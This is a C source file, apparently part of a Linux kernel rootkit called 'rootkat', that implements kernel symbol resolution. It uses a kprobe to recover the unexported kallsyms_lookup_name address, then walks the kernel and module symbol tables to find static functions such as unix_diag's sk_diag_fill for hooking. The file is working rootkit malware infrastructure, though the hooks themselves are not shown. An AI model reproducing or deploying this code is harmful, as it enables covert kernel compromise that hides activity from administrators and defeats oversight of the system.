// SPDX-License-Identifier: MIT
#include <linux/kprobes.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>
#include "kallsyms.h"

#define TAG "rootkat/kallsyms: "

typedef unsigned long (*lookup_fn_t)(const char *name);
static lookup_fn_t lookup_fn;

/*
 * Linux 6.4+ dropped `struct module *` from the kallsyms callback
 * signature; rootkat targets 7.0+, so we use the modern shape.
 */
typedef int (*kallsyms_cb_t)(void *data, const char *name, unsigned long addr);

/* Walks ONLY vmlinux's compressed kallsyms table — does NOT include
 * module symbols. */
typedef int (*on_each_t)(kallsyms_cb_t fn, void *data);
static on_each_t on_each_sym;

/* Walks an individual module's kallsyms table; modname filters which
 * module to walk. Added to mainline ~6.4 alongside the callback shape
 * change. This is what we need for static functions defined inside
 * modules (e.g. unix_diag's `sk_diag_fill`). */
typedef int (*mod_on_each_t)(const char *modname, kallsyms_cb_t fn, void *data);
static mod_on_each_t mod_on_each_sym;

static int __kprobes noop_pre(struct kprobe *p, struct pt_regs *regs)
{
	return 0;
}

int rootkat_kallsyms_init(void)
{
	struct kprobe kp = {
		.symbol_name = "kallsyms_lookup_name",
		.pre_handler = noop_pre,
	};
	int rc;

	rc = register_kprobe(&kp);
	if (rc < 0) {
		pr_err(TAG "register_kprobe failed: %d\n", rc);
		return rc;
	}
	lookup_fn = (lookup_fn_t)kp.addr;
	unregister_kprobe(&kp);

	if (!lookup_fn) {
		pr_err(TAG "lookup_fn NULL after probe\n");
		return -ENOENT;
	}
	return 0;
}

unsigned long rootkat_lookup_name(const char *name)
{
	if (!lookup_fn)
		return 0;
	return lookup_fn(name);
}

struct rootkat_lookup_ctx {
	const char *target_name;
	unsigned long result;        /* exact match — takes precedence */
	unsigned long fallback;      /* first suffixed match (e.g. ".cold") */
};

static int rootkat_lookup_cb(void *data, const char *name, unsigned long addr)
{
	struct rootkat_lookup_ctx *ctx = data;
	size_t tlen = strlen(ctx->target_name);

	if (strncmp(name, ctx->target_name, tlen))
		return 0;

	if (name[tlen] == '\0') {
		/* Exact match — definitive, stop iteration. */
		ctx->result = addr;
		return 1;
	}
	if (name[tlen] == '.' && !ctx->fallback) {
		/*
		 * Compiler-generated suffix (`.cold`, `.constprop.0`,
		 * `.isra.0`). Remember as a fallback in case no exact
		 * match exists, but keep iterating so an exact match
		 * later in the walk wins. The `.cold` copy in particular
		 * is a relocated error-path stub at an unaligned offset
		 * — hooking it would be incorrect.
		 */
		ctx->fallback = addr;
	}
	return 0;
}

unsigned long rootkat_lookup_in_module(const char *name,
                                       const char *module_name)
{
	struct rootkat_lookup_ctx ctx = {
		.target_name = name,
		.result      = 0,
	};

	if (module_name) {
		if (!mod_on_each_sym) {
			mod_on_each_sym = (mod_on_each_t)
				rootkat_lookup_name("module_kallsyms_on_each_symbol");
			if (!mod_on_each_sym) {
				pr_debug(TAG "module_kallsyms_on_each_symbol not resolved\n");
				return 0;
			}
		}
		mod_on_each_sym(module_name, rootkat_lookup_cb, &ctx);
	} else {
		if (!on_each_sym) {
			on_each_sym = (on_each_t)
				rootkat_lookup_name("kallsyms_on_each_symbol");
			if (!on_each_sym) {
				pr_debug(TAG "kallsyms_on_each_symbol not resolved\n");
				return 0;
			}
		}
		on_each_sym(rootkat_lookup_cb, &ctx);
	}

	if (!ctx.result && ctx.fallback) {
		pr_debug(TAG "no exact '%s'; using suffixed fallback in [%s] -> %lx\n",
		        name, module_name ? module_name : "vmlinux", ctx.fallback);
		ctx.result = ctx.fallback;
	}

	if (ctx.result)
		pr_debug(TAG "resolved '%s' in [%s] -> %lx\n",
		        name, module_name ? module_name : "vmlinux", ctx.result);
	else
		pr_debug(TAG "no '%s' in [%s]\n",
		        name, module_name ? module_name : "vmlinux");
	return ctx.result;
}
